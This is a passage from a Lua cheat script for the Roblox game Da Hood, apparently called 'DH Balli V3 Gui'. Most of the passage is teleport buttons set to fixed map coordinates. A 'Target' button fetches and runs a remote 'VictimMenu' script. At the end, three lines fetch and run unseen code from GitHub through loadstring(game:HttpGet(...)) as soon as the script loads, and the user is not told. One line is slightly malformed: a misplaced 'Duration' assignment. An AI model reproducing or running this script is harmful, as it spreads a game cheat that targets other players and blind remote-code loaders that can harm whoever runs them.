game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-971.4241333007812, 22.005887985229492, -630.115478515625)
end)
Section:NewButton("Swift", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-799.7603149414062, 21.8799991607666, -662.3109741210938)
end)
Section:NewButton("Military Base", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-50.412960052490234, 25.25499725341797, -868.921142578125)
end)
Section:NewButton("Da Boxing Club", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-232.0669708251953, 22.067293167114258, -1119.9541015625)
end)
Section:NewButton("Flowers", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-71.62272644042969, 23.15056800842285, -327.79412841796875)
end)
Section:NewButton("Hospital", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(98.40196228027344, 22.799989700317383, -484.89385986328125)
end)
Section:NewButton("Hood Kicks", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-203.53347778320312, 21.845796585083008, -410.1529846191406)
end)
Section:NewButton("Police Station", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-265.4999694824219, 21.797977447509766, -96.51517486572266)
end)
Section:NewButton("Barba", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9.003872871398926, 21.74802017211914, -107.73101043701172)
end)
Section:NewButton("Church", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(205.8213653564453, 23.77802085876465, -58.47077560424805)
end)
Section:NewButton("Basement", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(568.0475463867188, 4.623024940490723, -169.73257446289062)
end)
Section:NewButton("Train", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-426.41705322265625, -21.25197982788086, 44.953758239746094)
end)
local Tab = Window:NewTab("Target")
local Section = Tab:NewSection("must be displayname")
Section:NewButton("Target GUI (GS21)", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-VictimMenu-Script/main/Dh%20VictimMenu%3A%20Script"))()
end)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = ("DH Balli V3 Gui");
	Text = "Thanks for using DHB V3";
	Icon = "rbxthumb://type=Asset&id=13720894713&w=150&h=150"})
Duration = 16;

loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Barney1"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Discordhi"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/A"))()
